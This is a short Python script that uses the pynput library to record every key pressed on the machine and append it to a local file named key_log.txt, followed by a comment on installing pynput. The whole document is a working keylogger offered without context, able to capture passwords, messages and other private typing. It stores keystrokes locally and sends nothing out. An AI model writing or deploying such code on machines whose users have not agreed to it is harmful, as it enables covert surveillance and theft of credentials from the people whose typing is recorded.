import pynput

log_file = "key_log.txt"

def on_press(key):
    with open(log_file, "a") as f:
        f.write(f"{key}\n")

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()

#install pynput before using, use pip install pynput